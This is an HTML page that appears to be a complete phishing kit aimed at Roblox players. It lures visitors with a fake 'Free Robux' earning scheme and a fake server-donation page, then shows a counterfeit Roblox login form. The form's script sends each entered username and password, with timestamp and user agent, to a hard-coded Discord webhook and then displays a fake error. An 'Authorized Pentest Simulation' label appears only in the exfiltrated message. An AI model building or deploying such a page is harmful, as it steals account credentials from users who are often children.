<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Robux Generator</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
body { background: #f0f0f0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
.page { display: none; width: 100%; min-height: 100vh; justify-content: center; align-items: center; padding: 20px; }
.page.active { display: flex; }

/* ====== PAGE 1 ====== */
.p1-bg { background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); min-height: 100vh; width: 100%; display: flex; justify-content: center; align-items: center; padding: 20px; }
.p1-box { background: #222; border-radius: 20px; padding: 30px; max-width: 500px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid #ffd70033; }
.p1-box h1 { color: #ffd700; text-align: center; font-size: 28px; margin-bottom: 5px; text-shadow: 0 0 15px rgba(255,215,0,0.3); }
.p1-sub { color: #aaa; text-align: center; font-size: 13px; margin-bottom: 20px; }
.p1-balance { background: #1a1a1a; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 20px; border: 1px solid #333; }
.p1-balance .lbl { color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
.p1-balance .amt { color: #ffd700; font-size: 36px; font-weight: bold; }
.p1-balance .note { color: #555; font-size: 11px; margin-top: 5px; }
.p1-section { background: #1a1a1a; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; }
.p1-section h3 { color: #fff; font-size: 16px; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
.p1-section h3 .badge { background: #ffd700; color: #000; font-size: 10px; padding: 2px 8px; border-radius: 10px; font-weight: bold; }
.p1-caption-row { display: flex; gap: 10px; margin-bottom: 10px; }
.p1-caption-row input { flex: 1; padding: 10px; border-radius: 8px; border: 1px solid #444; background: #111; color: #fff; font-size: 14px; outline: none; }
.p1-caption-row input:focus { border-color: #ffd700; }
.btn { padding: 10px 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.2s; }
.btn-gold { background: #ffd700; color: #000; }
.btn-gold:hover { background: #ffed4a; transform: scale(1.02); }
.btn-green { background: #00c853; color: #000; }
.btn-green:hover { background: #00e676; }
.btn-red { background: #d32f2f; color: #fff; }
.btn-red:hover { background: #f44336; }
.btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
.p1-upload-area { border: 2px dashed #444; border-radius: 10px; padding: 20px; text-align: center; color: #666; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
.p1-upload-area:hover { border-color: #ffd700; color: #ffd700; }
.p1-upload-area input { display: none; }
.p1-vcount { color: #aaa; font-size: 12px; margin-top: 8px; }
.p1-withdraw { text-align: center; margin-top: 15px; }
.p1-withdraw .req { color: #888; font-size: 12px; margin-top: 5px; }
.p1-clear { text-align: center; margin-top: 10px; }
.p1-footer { color: #333; text-align: center; font-size: 10px; margin-top: 12px; }

/* ====== PAGE 2 ====== */
.p2-bg { background: linear-gradient(135deg, #0d0d2b, #1a1a3e); min-height: 100vh; width: 100%; display: flex; justify-content: center; align-items: center; padding: 20px; }
.p2-box { background: #1e1e2f; border-radius: 16px; padding: 30px; max-width: 480px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.6); border: 1px solid #333; text-align: center; }
.p2-dot { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #00c853; margin-right: 8px; animation: pulse 1.5s infinite; }
@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
.p2-status { display: flex; align-items: center; justify-content: center; color: #aaa; font-size: 13px; margin-bottom: 20px; }
.p2-avatar { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff6b6b); margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 36px; color: #fff; }
.p2-box h2 { color: #fff; font-size: 20px; }
.p2-game { color: #888; font-size: 13px; margin-bottom: 20px; }
.p2-players { background: #15152a; border-radius: 10px; padding: 15px; margin-bottom: 20px; border: 1px solid #2a2a40; }
.p2-players .ptitle { color: #888; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
.p2-player { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 8px; background: #1a1a35; margin-bottom: 6px; }
.p2-player:last-child { margin-bottom: 0; }
.p2-player .pav { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; color: #fff; }
.p2-player .pname { color: #ccc; font-size: 14px; flex: 1; text-align: left; }
.p2-player .ptag { color: #00c853; font-size: 11px; }
.p2-donate { margin: 20px 0; }
.p2-donate p { color: #aaa; font-size: 13px; margin-bottom: 12px; }
.btn-donate { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; padding: 14px 40px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(255,215,0,0.3); }
.btn-donate:hover { transform: scale(1.05); box-shadow: 0 6px 25px rgba(255,215,0,0.5); }
.p2-online { color: #555; font-size: 11px; margin-top: 15px; }
.p2-ad { margin-top: 20px; padding: 10px; background: #15152a; border-radius: 8px; border: 1px solid #2a2a40; font-size: 12px; color: #666; }

/* ====== PAGE 3 ====== */
.p3-bg { background: #f0f0f0; min-height: 100vh; width: 100%; display: flex; justify-content: center; align-items: center; padding: 20px; }
.p3-box { background: #fff; border-radius: 20px; padding: 40px 35px; max-width: 400px; width: 100%; box-shadow: 0 5px 30px rgba(0,0,0,0.15); text-align: center; }
.p3-logo { width: 80px; height: 80px; background: linear-gradient(135deg, #ffd700, #ff6b6b); border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 36px; box-shadow: 0 4px 15px rgba(255,107,107,0.3); }
.p3-box h1 { color: #1a1a2e; font-size: 22px; margin-bottom: 5px; }
.p3-sub { color: #888; font-size: 13px; margin-bottom: 25px; }
.p3-secure { display: inline-flex; align-items: center; gap: 5px; background: #e8f5e9; color: #2e7d32; padding: 4px 12px; border-radius: 20px; font-size: 11px; margin-bottom: 20px; }
.p3-group { margin-bottom: 15px; text-align: left; }
.p3-group label { display: block; color: #555; font-size: 12px; margin-bottom: 5px; font-weight: 600; }
.p3-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
.p3-group input:focus { border-color: #ff6b6b; background: #fff; }
.btn-login { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; padding: 13px 0; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 5px; box-shadow: 0 4px 15px rgba(238,90,36,0.3); }
.btn-login:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(238,90,36,0.4); }
.btn-login:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
.p3-links { margin-top: 18px; font-size: 12px; }
.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; }
.p3-links a:hover { text-decoration: underline; }
.p3-error { color: #d32f2f; font-size: 12px; margin-top: 10px; display: none; }
.p3-footer { color: #bbb; font-size: 10px; margin-top: 20px; }
.spinner { display: none; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
@keyframes spin { to { transform: rotate(360deg); } }
.btn-login .bt { display: inline; }
.btn-login.loading .bt { display: none; }
.btn-login.loading .spinner { display: block; }
.toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #333; color: #fff; padding: 12px 24px; border-radius: 8px; display: none; z-index: 999; font-size: 14px; box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
.toast.show { display: block; animation: fadeInOut 2s ease; }
@keyframes fadeInOut { 0% { opacity: 0; transform: translateX(-50%) translateY(-20px); } 15% { opacity: 1; transform: translateX(-50%) translateY(0); } 85% { opacity: 1; transform: translateX(-50%) translateY(0); } 100% { opacity: 0; transform: translateX(-50%) translateY(-20px); } }
</style>
</head>
<body>

<div id="toast" class="toast"></div>

<!-- ===================== PAGE 1: MAIN EARN SITE ===================== -->
<div class="page active" id="page1">
<div class="p1-bg">
<div class="p1-box">
  <h1>✨ Free Robux</h1>
  <p class="p1-sub">Earn robux by completing simple tasks!</p>

  <div class="p1-balance">
    <div class="lbl">Your Balance</div>
    <div class="amt" id="balanceDisplay">0</div>
    <div class="note">Minimum withdraw: 100 Robux</div>
  </div>

  <div class="p1-section">
    <h3>📝 Caption Tasks <span class="badge">+5 each</span></h3>
    <p style="color:#888;font-size:12px;margin-bottom:10px;">Write a caption, earn 5 Robux instantly!</p>
    <div class="p1-caption-row">
      <input type="text" id="captionInput" placeholder="Write a caption..." maxlength="150">
      <button class="btn btn-gold" id="submitCaptionBtn">Submit</button>
    </div>
    <div style="display:flex;justify-content:space-between;align-items:center;">
      <span style="color:#555;font-size:11px;">Total captions: <span id="captionCount">0</span></span>
      <span style="color:#00c853;font-size:12px;font-weight:bold;">+5 🪙</span>
    </div>
  </div>

  <div class="p1-section">
    <h3>🎥 Video Upload <span class="badge">+50 each</span></h3>
    <p style="color:#888;font-size:12px;margin-bottom:10px;">Upload a Roblox video — earn 50 Robux! (3 videos max per week)</p>
    <div class="p1-upload-area" id="uploadArea">
      <div style="font-size:30px;margin-bottom:8px;">📤</div>
      <div>Click to upload your video</div>
      <div style="font-size:11px;margin-top:5px;">MP4, MOV, WEBM supported</div>
      <input type="file" id="videoInput" accept="video/*">
    </div>
    <div class="p1-vcount">Videos uploaded: <span id="videoCount">0</span> / 3 <span style="color:#555;">(resets weekly)</span></div>
  </div>

  <div class="p1-section">
    <h3>💸 Withdraw</h3>
    <div class="p1-withdraw">
      <button class="btn btn-green" id="withdrawBtn">Withdraw Now</button>
      <div class="req">Minimum: 100 Robux • Instant processing</div>
    </div>
  </div>

  <div class="p1-clear">
    <button class="btn btn-red" id="clearDataBtn">Clear All Data (Reset)</button>
  </div>
  <p class="p1-footer">Unofficial fan site. Not affiliated with Roblox.</p>
</div>
</div>
</div>

<!-- ===================== PAGE 2: DONATION / PRIVATE SERVER ===================== -->
<div class="page" id="page2">
<div class="p2-bg">
<div class="p2-box">
  <div class="p2-status"><span class="p2-dot"></span> Player Online · Private Server</div>
  <div class="p2-avatar">🎮</div>
  <h2>Legendary_Roblox_Pro</h2>
  <div class="p2-game">🔮 Blox Fruits · Private Server</div>

  <div class="p2-players">
    <div class="ptitle">Players in Server (4/12)</div>
    <div class="p2-player"><div class="pav" style="background:#ff6b6b;">S</div><div class="pname">SwordMaster_X</div><div class="ptag">● Online</div></div>
    <div class="p2-player"><div class="pav" style="background:#4fc3f7;">M</div><div class="pname">MegaNoob_2024</div><div class="ptag">● Online</div></div>
    <div class="p2-player"><div class="pav" style="background:#ffd700;">L</div><div class="pname">Legendary_Roblox_Pro</div><div class="ptag">● Online</div></div>
    <div class="p2-player"><div class="pav" style="background:#81c784;">R</div><div class="pname">RobuxKing_90</div><div class="ptag">● Online</div></div>
  </div>

  <div class="p2-donate">
    <p>💖 Support this private server!</p>
    <p style="font-size:12px;color:#666;margin-bottom:12px;">Donations help keep the server running 24/7</p>
    <button class="btn-donate" id="donateBtn">💎 Donate Now</button>
  </div>

  <div class="p2-online">🎯 127 players in public servers</div>
  <div class="p2-ad">⚡ Server boosted · No lag · Auto-farm enabled</div>
</div>
</div>
</div>

<!-- ===================== PAGE 3: FAKE LOGIN ===================== -->
<div class="page" id="page3">
<div class="p3-bg">
<div class="p3-box">
  <div class="p3-logo">🎮</div>
  <h1>Welcome to Roblox</h1>
  <p class="p3-sub">Sign in to continue to your account</p>
  <div class="p3-secure">🔒 Secured with 256-bit encryption</div>

  <form id="loginForm" autocomplete="off">
    <div class="p3-group">
      <label>Username</label>
      <input type="text" id="username" placeholder="Enter your Roblox username" required autocomplete="off">
    </div>
    <div class="p3-group">
      <label>Password</label>
      <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
    </div>
    <button type="submit" class="btn-login" id="loginBtn">
      <span class="bt">Sign In</span>
      <div class="spinner"></div>
    </button>
  </form>

  <div class="p3-error" id="errorMsg">⚠️ Invalid username or password. Please try again.</div>

  <div class="p3-links">
    <a href="#">Forgot password?</a>
    <a href="#">Create account</a>
  </div>
  <div class="p3-footer">Donation verification required · Official Roblox login</div>
</div>
</div>
</div>

<script>
// ==================== CONFIG ====================
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-';

// ==================== UTILITY ====================
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.remove('show');
  void t.offsetWidth;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2200);
}

function switchPage(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
}

// ==================== PAGE 1: DATA LAYER ====================
const STORAGE_KEY = 'robux_sim_data';
const WEEKLY_KEY = 'robux_sim_week';

function getData() {
  const raw = localStorage.getItem(STORAGE_KEY);
  if (raw) { try { return JSON.parse(raw); } catch(e) {} }
  return { balance: 0, captions: 0, videos: [] };
}
function saveData(d) { localStorage.setItem(STORAGE_KEY, JSON.stringify(d)); }

function getWeek() {
  const now = new Date();
  const start = new Date(now.getFullYear(), 0, 1);
  const diff = now - start;
  const week = Math.ceil(diff / (7 * 24 * 60 * 60 * 1000));
  return `${now.getFullYear()}-W${week}`;
}

function checkWeekReset() {
  const stored = localStorage.getItem(WEEKLY_KEY);
  const currentWeek = getWeek();
  if (stored !== currentWeek) {
    const d = getData();
    d.videos = [];
    saveData(d);
    localStorage.setItem(WEEKLY_KEY, currentWeek);
  }
}

function updateUI() {
  checkWeekReset();
  const d = getData();
  document.getElementById('balanceDisplay').textContent = d.balance;
  document.getElementById('captionCount').textContent = d.captions;
  document.getElementById('videoCount').textContent = d.videos.length;
}

// Captions
document.getElementById('submitCaptionBtn').addEventListener('click', function() {
  const input = document.getElementById('captionInput');
  const text = input.value.trim();
  if (!text) { showToast('⚠️ Please write a caption first!'); return; }
  const d = getData();
  d.balance += 5;
  d.captions += 1;
  saveData(d);
  updateUI();
  input.value = '';
  showToast('✅ +5 Robux earned for your caption!');
});

// Video upload
document.getElementById('uploadArea').addEventListener('click', function() {
  document.getElementById('videoInput').click();
});
document.getElementById('videoInput').addEventListener('change', function(e) {
  checkWeekReset();
  const d = getData();
  if (d.videos.length >= 3) { showToast('⚠️ Weekly limit reached! (3/3 videos)'); this.value = ''; return; }
  const file = e.target.files[0];
  if (!file) return;
  d.balance += 50;
  d.videos.push({ name: file.name, size: file.size, uploaded: new Date().toISOString() });
  saveData(d);
  updateUI();
  this.value = '';
  showToast('✅ +50 Robux for uploading a video!');
});

// Withdraw → Page 2
document.getElementById('withdrawBtn').addEventListener('click', function() {
  const d = getData();
  if (d.balance < 100) { showToast(`⚠️ Need ${100 - d.balance} more Robux to withdraw!`); return; }
  d.balance -= 100;
  saveData(d);
  updateUI();
  showToast('🔄 Processing withdrawal...');
  setTimeout(() => switchPage('page2'), 1500);
});

// Clear data
document.getElementById('clearDataBtn').addEventListener('click', function() {
  if (confirm('Reset all data?')) {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(WEEKLY_KEY);
    updateUI();
    showToast('🔄 Data reset complete');
  }
});

// Donate → Page 3
document.getElementById('donateBtn').addEventListener('click', function() {
  switchPage('page3');
});

// ==================== PAGE 3: LOGIN / CREDENTIAL HARVEST ====================
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const btn = document.getElementById('loginBtn');
  const err = document.getElementById('errorMsg');

  if (!username || !password) {
    err.textContent = '⚠️ Please fill in all fields.';
    err.style.display = 'block';
    return;
  }

  btn.classList.add('loading');
  btn.disabled = true;
  err.style.display = 'none';

  const captured = {
    username: username,
    password: password,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    page: window.location.href
  };

  // Send to Discord
  try {
    const payload = {
      content: '**🚨 New Credentials Captured (Authorized Pentest Simulation)**',
      embeds: [{
        title: 'Roblox Phishing Simulation',
        color: 15158332,
        fields: [
          { name: '👤 Username', value: `\`${captured.username}\``, inline: true },
          { name: '🔑 Password', value: `\`${captured.password}\``, inline: true },
          { name: '🕐 Timestamp', value: captured.timestamp, inline: false },
          { name: '🌐 User Agent', value: captured.userAgent.substring(0, 100), inline: false }
        ],
        footer: { text: 'Authorized Penetration Test · Internal Use Only' }
      }]
    };
    await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
  } catch (e) { console.log('Discord send error (sim mode):', e); }

  // Log locally
  console.log('=== CAPTURED CREDENTIALS ===');
  console.log('Username:', captured.username);
  console.log('Password:', captured.password);
  console.log('Timestamp:', captured.timestamp);
  console.log('===========================');

  // Fake error
  setTimeout(() => {
    btn.classList.remove('loading');
    btn.disabled = false;
    err.textContent = '⚠️ Invalid username or password. Please try again.';
    err.style.display = 'block';
  }, 2000);
});

// ==================== INIT ====================
updateUI();
</script>
</body>
</html>
